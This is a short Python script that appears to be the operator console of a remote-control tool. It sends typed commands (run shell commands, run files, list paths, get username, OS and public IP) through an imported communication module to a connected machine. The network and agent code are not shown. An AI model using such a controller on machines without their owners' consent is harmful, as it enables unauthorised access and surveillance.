# -*- coding: utf-8 -*-

import communication as Network
import time

command = ""
while ( command != "exit" ):

    command = input ( ">_ " )

    if (command == "help"):
        print ( "# shell <command> - Executes a shell command" )
        print ( "run <process> - Executes a file" )
        print ( "open <website> - Opens a website" )
        print ( "files <path> - Lists file in the specified path" )
        print ( "pc - Gets computer name info" )
        print ( "username - Gets current username" )
        print ( "os - Gets operating system" )
        print ( "ip - Gets public ip" )

    if ( command != "exit" and command != "help" ):
        if ( Network.set_command ( command ) ):
            while ( Network.get_command () != "NONE" ):
                time.sleep (0.5)
            
            print ( Network.get_response() )
        else:
            while ( not Network.is_connected() ):
                print ("Attempting to reconnect to the server..")
                time.sleep(1)